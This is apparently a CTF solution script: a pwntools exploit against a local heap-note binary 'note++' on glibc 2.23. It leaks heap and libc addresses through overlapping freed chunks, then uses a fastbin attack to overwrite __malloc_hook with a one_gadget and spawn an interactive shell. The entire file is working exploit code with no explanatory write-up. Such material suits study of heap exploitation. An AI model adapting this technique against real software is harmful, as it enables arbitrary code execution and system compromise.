#!/usr/bin/env python3                                                                                                                                                  
# -*- coding: UTF-8 -*-
from pwn import *
context.log_level = "debug"
epath = "./note++"
lpath = "/lib/x86_64-linux-gnu/libc-2.23.so"
e = ELF(epath)
l = ELF(lpath)
r = process(epath)
 
def add(sz, s1, s2):
    r.sendlineafter(">", str(1))
    r.sendlineafter("Size:", str(sz))
    r.sendlineafter("Note: ", s1)
    r.sendlineafter("this note: ", s2)
    return
def show():
    r.sendlineafter(">", str(2))
    return
def free(idx):
    r.sendlineafter(">", str(3))
    r.sendlineafter(": ", str(idx))
    return
   
add(0x60, b"AAAA", b"A")
add(0x60, b"BBBB", b"B")
add(0x60, b"CCCC", b"C")
add(0x60, b"D"*0x58 + p64(0x71), b"D")
add(0x78, b"E"*0x78, b"\x00"*0x30)
add(0x78, b"F"*0x78, b"F")
add(0x10, b"GGGG", b"G")
free(3)
free(1)
free(2)
free(0)
add(0x60, b"AAAA", b"A"*0x38)
show()
'''
Note 0:
  Data: AAAA
    Desc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Note 1:
      Data: P1\x03\xfe\xb3U
'''
r.recvuntil("1:")
r.recvuntil("Data:")
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
success("Leak B : %s" % hex(leak))
offset = 0x150
heapbase = leak - offset
success("heapbase : %s" % hex(heapbase))
 
free(1)
add(0x60, p64(heapbase+0x1b0), b"A")
add(0x60, b"A", b"A")
add(0x60, b"A", b"A")
add(0x60, p64(0) + p64(0x101), b"A")
free(4)
free(3)
add(0x60, b"A", b"\x00"*0x38)
show()
'''
Note 4:
\xcbp\x7f
  Desc: E
'''
r.recvuntil("4:")
r.recvuntil("Data:")
leak = u64(r.recvline().strip().ljust(8, b"\x00"))
success("mchunkptr top : %s" % hex(leak))
l.address = leak - 0x3c4b78
success("libc : %s" % hex(l.address)) # not stable

free(1)
free(2)
free(0)
add(0x60, b"A", b"\x00"*0x38)
free(1)
add(0x60, p64(l.sym.__malloc_hook-0x23), b"A")
add(0x60, b"A", b"A")
add(0x60, b"A", b"A")
#add(0x60, b"\x00"*0x13 + p64(0x1234), b"A")
add(0x60, b"\x00"*0x13 + p64(l.address + 0xf03a4), b"A")
pause()
free(4)

r.interactive()
r.close()
